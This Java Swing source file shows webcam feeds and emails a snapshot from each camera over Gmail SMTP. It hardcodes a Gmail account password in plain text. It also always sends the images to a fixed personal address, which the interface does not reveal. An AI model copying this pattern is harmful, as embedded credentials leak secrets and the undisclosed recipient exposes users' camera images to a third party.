import java.awt.Dimension;
//import java.awt.FlowLayout;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

import javax.imageio.ImageIO;
import javax.swing.AbstractAction;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamPanel;
import com.github.sarxos.webcam.WebcamResolution;

//email

import java.util.Properties;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;



@SuppressWarnings("serial")
public class ScreenshotProgram extends JFrame {

	private class SnapMeAction extends AbstractAction {

		public SnapMeAction() {
			super("Snapshot");
		}

		@Override
		public void actionPerformed(ActionEvent e) {
			try {
				for (int i = 0; i < webcams.size(); i++) {
					Webcam webcam = webcams.get(i);
					File file = new File(String.format("Screen_%d.jpg", i));
					ImageIO.write(webcam.getImage(), "JPG", file);
					System.out.format("Image for %s saved in %s \n", webcam.getName(), file);
					SentEmail(file);
				}
			} catch (IOException e1) {
				e1.printStackTrace();
			}
		}
	}

	private Executor executor = Executors.newSingleThreadExecutor();
	private Dimension size = WebcamResolution.VGA.getSize();
	private List<Webcam> webcams = Webcam.getWebcams();
	private List<WebcamPanel> panels = new ArrayList<WebcamPanel>();
	private JButton btSnapMe = new JButton(new SnapMeAction());
	private JTextField emailTextField = new JTextField();
	JLabel Text = new JLabel ("Email :");

	public void SentEmail(File file) 
	{
		System.out.println(emailTextField.getText());
        // Recipient's email ID needs to be mentioned.
        String to = "liubomyr.sloika@gmail.com";
        // Sender's email ID needs to be mentioned
        String from = "screen.capture.java@gmail.com";
        // Assuming you are sending email from through gmails smtp
        String host = "smtp.gmail.com";

        // Get system properties
        Properties properties = System.getProperties();

        // Setup mail server
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", "465");
        properties.put("mail.smtp.ssl.enable", "true");
        properties.put("mail.smtp.auth", "true");

        // Get the Session object.// and pass username and password
        Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication("screen.capture.java@gmail.com", "12345678aA@");
            }
        });

        try {
            // Create a default MimeMessage object.
            MimeMessage message = new MimeMessage(session);
            // Set From: header field of the header.
            message.setFrom(new InternetAddress(from));
            // Set To: header field of the header.
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            if(!emailTextField.getText().isEmpty()) {
                message.addRecipient(Message.RecipientType.TO, new InternetAddress(emailTextField.getText()));    	
            }

            // Set Subject: header field
            message.setSubject("This is screenshot!");
            Multipart multipart = new MimeMultipart();
            MimeBodyPart attachmentPart = new MimeBodyPart();
            MimeBodyPart textPart = new MimeBodyPart();
            try {
                attachmentPart.attachFile(file);
                textPart.setText("This is screenshot");
                multipart.addBodyPart(textPart);
                multipart.addBodyPart(attachmentPart);
            } catch (IOException e) {
                e.printStackTrace();
            }
            message.setContent(multipart);
            System.out.println("sending...");
            // Send message
            Transport.send(message);
            System.out.println("Sent message successfully....");
        } catch (MessagingException mex) {
            mex.printStackTrace();
        }
	}
	
	public ScreenshotProgram() {
		super("Screen Capture Program");

		for (Webcam webcam : webcams) {
			webcam.setViewSize(size);
			WebcamPanel panel = new WebcamPanel(webcam, size, false);
			panel.setFPSDisplayed(true);
			panels.add(panel);
		}

		for (WebcamPanel panel : panels) {
			panel.start();
		}

		setLayout(new GridBagLayout());
		GridBagConstraints gbc = new GridBagConstraints();
		
		gbc.gridx = 0;
		gbc.gridy = 0;
		gbc.gridwidth = 5;
		
		for (WebcamPanel panel : panels) {
			add(panel, gbc);
		}
		
		emailTextField.setPreferredSize(new Dimension(250, 25));
		gbc = new GridBagConstraints();
		
		gbc.gridx = 2;
		gbc.gridy = 1;
		add(Text,gbc);
		
		gbc.gridx = 3;
		gbc.gridy = 1;
		add(emailTextField, gbc);

		gbc.gridx = 4;
		gbc.gridy = 1;
		add(btSnapMe, gbc);
		pack();
		setVisible(true);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
	}

	public static void main(String[] args) {
		new ScreenshotProgram();
	}
}
